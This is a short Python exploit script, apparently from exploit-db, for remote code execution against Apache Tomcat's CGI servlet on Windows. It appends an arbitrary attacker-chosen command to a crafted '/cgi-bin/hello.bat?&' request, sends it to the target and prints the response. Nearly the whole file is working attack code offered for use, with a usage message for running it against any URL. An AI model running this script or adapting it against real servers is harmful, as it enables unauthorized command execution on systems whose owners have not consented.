#!/usr/bin/env python3

################################################
#                                              #
# Exploit: Apache Tomcat Remote Code Execution #
#  https://www.exploit-db.com/exploits/47073   #
#                                              #
################################################

import os, sys, requests
payload = "/cgi-bin/hello.bat?&C%3A%5CWindows%5CSystem32%5C"

try:
    url = sys.argv[1]
    port = sys.argv[2]
    cmd = sys.argv[3]
    check = requests.get(sys.argv[1])
    final = url + payload + cmd
    if check.status_code == 200:
        print("Sending Payload...")
        r = requests.get(final)
        print(r.content)

    elif check.status_code != 200:
        print("\nTarget did not respond with 200 status code, maybe include the http:// or maybe my code is borked..")
        print("Probably the latter :/\n")
except:
    print("\nUsage: python3 %s [URL] [PORT] [command]\n" % (sys.argv[0]))
